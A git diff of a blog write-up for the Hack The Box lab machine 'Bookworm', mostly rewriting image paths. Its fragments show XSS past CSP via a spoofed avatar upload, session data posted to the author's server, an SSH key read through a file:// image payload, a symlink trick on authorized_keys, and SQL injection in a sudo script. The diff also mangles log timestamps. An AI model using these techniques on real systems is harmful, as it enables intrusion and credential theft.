@@ -1,18 +1,23 @@
 ---
+title:  "HTB Bookworm Writeup"
+date:   2024-01-23 00:30:00 
+categories: HTB Machine
+tags: SQLI Directory-Traversal Postscript-Injection LFI XSS-Bypass-CSP Symlink File-Bypass
+---
 
 
-![](2024-01-23-15-48-24.png)
+![](/images/bookworm/2024-01-23-15-48-24.png)
 
 # Machine Info
  > Bookworm is an insane Linux machine that features a number of web exploitation techniques. It features a website for a book store with a checkout process vulnerable to HTML injection, as well as an IDOR vulnerability that allows the updating of shop baskets for any user. Leveraging these vulnerabilities is possible by taking advantage of an insecure avatar file upload, where a malicious JavaScript file can be uploaded to bypass CSP restrictions. By exploiting this chain of vulnerabilities a CSRF payload is crafted to enumerate hidden endpoints and discover an LFI to leak database credentials for the underlying ExpressJS web application. Lateral movement is achieved by exploiting an LFI and a symlink vulnerability with an eBook conversion utility. Finally, sudo access to a script susceptible to SQL Injection leads to privileged arbitrary file read/write through a PostScript template, leading to a shell as root.
  
 
- ![](2024-01-23-15-50-27.png)
+ ![](/images/bookworm/2024-01-23-15-50-27.png)
 
  Look at there have login form you can create your account login i've has been login so now we try find `html injection` because on machine info there said vulnerable to `Html Injection` also an IDOR vulnerability . First of all go to shop and add to basket after you added go to your basket and edit the note and fill it with html code like this
  `<h1>dsd` then update the note . Going to complete checkout and html has been injected
 
- ![](2024-01-23-15-55-49.png)
+ ![](/images/bookworm/2024-01-23-15-55-49.png)
 
  Looking at the url there have number id so i thinking IDOR vulnerability on this url let's we try change the number id . It's not working maybe IDOR vulnerability on another path .I've been tried xss attack and it's not working because it was prevent by CSP `Content-Security-Policy: The page’s settings blocked the loading of a resource at inline (“script-src”)`.To bypass CSP `script-src` need find xss in this domain and include with script src . Let's do it
 
@@ -24,12 +29,12 @@
 The form in `/profile` we can upload avatar image for our account . Only jpg and png only can upload so we need bypass it the `Content-Type` . We'll upload `test.jpg` with tampering burpsuite and i rename `test.jpg` to `test.txt` or also you can upload `test.txt` directly and change the content-type but my situation now my `test.txt` not  are appearing so i need rename my file to .jpg first and rename on my burpsuite . Now upload your img and tampering with burpsuite and send to `Repeater`
 
 
-![](2024-01-23-16-25-21.png)
+![](/images/bookworm/2024-01-23-16-25-21.png)
 
 You can using anything name extension files but you must Content-Type `image/jpg` or `image/png`
 ## XSS bypassing CSP
 
-![](2024-01-23-16-27-11.png)
+![](/images/bookworm/2024-01-23-16-27-11.png)
 
 Now we've successfully bypassed file upload restrictions  . So look at the response is worked has been bypassed so now we just append xss code on `test.txt`
 
@@ -47,7 +52,7 @@ Now we can upload a Javascript payload to our my avatar , also we can use HTML i
 ```
 Go to your basket and copy this payload and fill it on our edit note
 
-![](2024-01-23-16-52-03.png)
+![](/images/bookworm/2024-01-23-16-52-03.png)
 
 CSP successfully bypassed
 
@@ -80,7 +85,7 @@ fetch("http://bookworm.htb/profile", { mode: 'no-cors' })
     });
 ```
 
-![](2024-01-23-19-55-25.png)
+![](/images/bookworm/2024-01-23-19-55-25.png)
 
 I put this code on `test.txt` and i included file path have malicious code javascript to `Edit notes` but `python3 -m http.server` does not support `POST` response so our created code http.server the usage is same but the difference is this code support `POST` request 
 
@@ -91,7 +96,7 @@ Starting server on port 8000
 
     <tr>
       <th scope="row">Order #168</th>
-      <td>Tue Jan 23 2024 07:50:12 GMT+0000 (Coordinated Universal Time)</td>
+      <td>Tue Jan 23 /images/bookworm/2024 07:50:12 GMT+0000 (Coordinated Universal Time)</td>
       <td>£14</td>
       <td>
         <a href="/order/168">View Order</
@@ -100,7 +105,7 @@ Starting server on port 8000
     
     <tr>
       <th scope="row">Order #170</th>
-      <td>Tue Jan 23 2024 07:55:01 GMT+0000 (Coordinated Universal Time)</td>
+      <td>Tue Jan 23 /images/bookworm/2024 07:55:01 GMT+0000 (Coordinated Universal Time)</td>
       <td>£17</td>
       <td>
         <a href="/order/170">View Order</
@@ -109,7 +114,7 @@ Starting server on port 8000
     
     <tr>
       <th scope="row">Order #172</th>
-      <td>Tue Jan 23 2024 08:00:58 GMT+0000 (Coordinated Universal Time)</td>
+      <td>Tue Jan 23 /images/bookworm/2024 08:00:58 GMT+0000 (Coordinated Universal Time)</td>
       <td>£17</td>
       <td>
         <a href="/order/172">View Order</
@@ -118,7 +123,7 @@ Starting server on port 8000
     
     <tr>
       <th scope="row">Order #185</th>
-      <td>Tue Jan 23 2024 08:51:47 GMT+0000 (Coordinated Universal Time)</td>
+      <td>Tue Jan 23 /images/bookworm/2024 08:51:47 GMT+0000 (Coordinated Universal Time)</td>
       <td>£14</td>
       <td>
         <a href="/order/185">View Order</
@@ -126,7 +131,7 @@ Starting server on port 8000
     </tr>
     <tr>
       <th scope="row">Order #230</th>
-      <td>Tue Jan 23 2024 11:54:12 GMT+0000 (Coordinated Universal Time)</td>
+      <td>Tue Jan 23 /images/bookworm/2024 11:54:12 GMT+0000 (Coordinated Universal Time)</td>
       <td>£14</td>
       <td>
         <a href="/order/230">View Order</
@@ -143,7 +148,7 @@ Starting server on port 8000
   </body>
 </html>
 
-10.10.14.122 - - [23/Jan/2024 07:00:08] "POST / HTTP/1.1" 200 -
+10.10.14.122 - - [23/Jan//images/bookworm/2024 07:00:08] "POST / HTTP/1.1" 200 -
 ```
 
 
@@ -230,8 +235,8 @@ To run this code we need running `post.py` and `basket.py`
 
 ```
  python3 post.py | grep href
-10.10.14.122 - - [23/Jan/2024 07:22:49] "POST / HTTP/1.1" 200 -
-10.10.11.215 - - [23/Jan/2024 07:23:19] "POST / HTTP/1.1" 200 -
+10.10.14.122 - - [23/Jan//images/bookworm/2024 07:22:49] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan//images/bookworm/2024 07:23:19] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -244,7 +249,7 @@ To run this code we need running `post.py` and `basket.py`
         <a href="/order/172">View Order</
         <a href="/order/185">View Order</
         <a href="/order/230">View Order</
-10.10.11.215 - - [23/Jan/2024 07:23:19] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan//images/bookworm/2024 07:23:19] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -289,7 +294,7 @@ After i ran `post.py` and `basket.py` i saw file .pdf on `/download`
 ```
  <a href="/download/7?bookIds=9" download="Tom Slade with the Flying Corps: A Campfire Tale.pdf">Download e-book</a>
 <a href="/profile">View Your Other Orders</a>
-10.10.11.215 - - [23/Jan/2024 08:26:08] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan//images/bookworm/2024 08:26:08] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -330,7 +335,7 @@ text})
 After a few minutes we have successfully get the file contain pdf
 
 ```
-10.10.11.215 - - [23/Jan/2024 08:46:53] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan//images/bookworm/2024 08:46:53] "POST / HTTP/1.1" 200 -
 %PDF-1.3
 3 0 obj
 <</Type /Page
@@ -341,8 +346,8 @@ endobj
 4 0 obj
 <</Filter /FlateDecode /Length 95>>
 stream
-x�3R��2�35W(�r
-Q�w3T04�Z*�[�ꙛ+��(hx$�+x��$�f�i*�d����L2�`��k�gf�P����c��
+x 3R  2 35W( r
+Q w3T04 Z* [ ꙛ+  (hx$ +x  $ f i* d    L2 `  k gf P    c  
 endstream
 endobj
 1 0 obj
@@ -393,13 +398,13 @@ fetch('/profile', {credentials: 'include'})
 
 ```
 Starting server on port 8000
-p�>VHans Holbein.pdfmR�nA%F�
-R��E"9���3^G����*A^�HAX���^�7�g��1�T�
+p >VHans Holbein.pdfmR nA%F 
+R  E"9   3^G    *A^ HAX   ^ 7 g  1 T 
 <...snip...>
-N�WW�$�h�c��?
-VU�<��|.�UxUy��l�K�ǡo��d�m^���b����/��FA!��z���,�c�����_O�9.!
-ί�˲Kx�P���"Pp�>Vɚ�o� �Hans Holbein.pdfP���V���"'
-���Unknown.pdfPKw
+N WW $ h c  ?
+VU <  |. UxUy  l K ǡo  d m^   b    /  FA!  z   , c     _O 9.!
+ί ˲Kx P   "Pp >Vɚ o   Hans Holbein.pdfP   V   "'
+   Unknown.pdfPKw
 10.10.11.215 - - [04/Dec/2023 18:14:30] "POST / HTTP/1.1" 200 -
 ```
 the response still same as pdf file but look like zip file to get file contain `Unknown.pdf` we'll try create a python webserver to get the pdf file.
@@ -564,7 +569,7 @@ Let's we forward port 3001 to my localhost
 
 `ssh -L 3001:127.0.0.1:3001 frank@bookworm.htb`
 
-![](2024-01-24-15-16-44.png)
+![](/images/bookworm/2024-01-24-15-16-44.png)
 
 There show the file upload . There gave your hint with `converter` so let's we find the directory `converter` . I found directory converter on `/home/neil`
 
@@ -694,7 +699,7 @@ Go to repeater and change `test.txt` to `test.html` and change the file contains
 
 `<img src="file:///home/neil/.ssh/id_ed25519">`
 
-![](2024-01-24-19-28-00.png)
+![](/images/bookworm/2024-01-24-19-28-00.png)
 
 Right click mouse on the request and then click > `Request in browser` > `in original session` and then just copy the url and go to your browser and you will get the priv8 keys . Or you can just upload `test.html` directly
 
@@ -811,12 +816,12 @@ const convertEbook = path.join(__dirname, "calibre", "ebook-convert");
 So our found another way to upload the public keys as authorized_keys . Going to localhost:3001 we'll try directory traversal in `outputType`, since the web application does not seem to properly sanitize user input. In the `outputType` section, we specify the path of the neil user's authorized_keys file, in an
 attempt to write the public key to it.
 
-![](2024-01-25-10-43-18.png)
+![](/images/bookworm/2024-01-25-10-43-18.png)
 
 It's failed to created authorized_keys with a `404 Not Found` response .
 If we change the path to /tmp/test , we do see that neil is creating files in the directory that we specify
 
-![](2024-01-25-10-45-39.png)
+![](/images/bookworm/2024-01-25-10-45-39.png)
 
 ```
 frank@bookworm:~$ ls /tmp
@@ -844,7 +849,7 @@ drwxr-xr-x 18 root  root  3960 Jan 24 05:03 ..
 lrwxrwxrwx  1 frank frank   31 Jan 25 03:08 pwn.txt -> /home/neil/.ssh/authorized_keys
 ```
 
-![](2024-01-25-11-12-04.png)
+![](/images/bookworm/2024-01-25-11-12-04.png)
 
 I've got `500 Internal Server` because has been protected by symlink [protected_symlink](https://sysctl-explorer.net/fs/protected_symlinks/)
 
@@ -860,12 +865,12 @@ frank@bookworm:~$ pwd
 /home/frank
 ```
 
-![](2024-01-25-11-20-16.png)
+![](/images/bookworm/2024-01-25-11-20-16.png)
 
 It's worked !! so now we just login the ssh with neil priv8 keys
 
 
-![](2024-01-25-11-17-53.png)
+![](/images/bookworm/2024-01-25-11-17-53.png)
 
 Successfully login SSH
 
@@ -893,7 +898,7 @@ Documents available in /tmp/tmp170yfwddprintgen
 ```
 There generated a pdf file using order id .
 
-![](2024-01-25-11-25-38.png)
+![](/images/bookworm/2024-01-25-11-25-38.png)
 
 I used python3 http.server to download `output.pdf`
 
@@ -941,7 +946,7 @@ I’ll give it a order that doesn’t exist (1111) and then use UNION injection 
 
 sudo genlabel '1111 UNION SELECT 1,2,3,4,5,6,7;'
 
-![](2024-01-25-11-43-31.png)
+![](/images/bookworm/2024-01-25-11-43-31.png)
 
 Nah Sql injection has been injected because i've used 1-7 numbers using Union Select and the output shows 1-7 numbers .
 
@@ -1037,7 +1042,7 @@ Documents available in /tmp/tmp1xahbz52printgen
 
 Successfully uploaded my public keys into root `authorized_keys` file . Let's login as root
 
-![](2024-01-25-12-13-28.png)
+![](/images/bookworm/2024-01-25-12-13-28.png)
 
 It's Worked !!
 
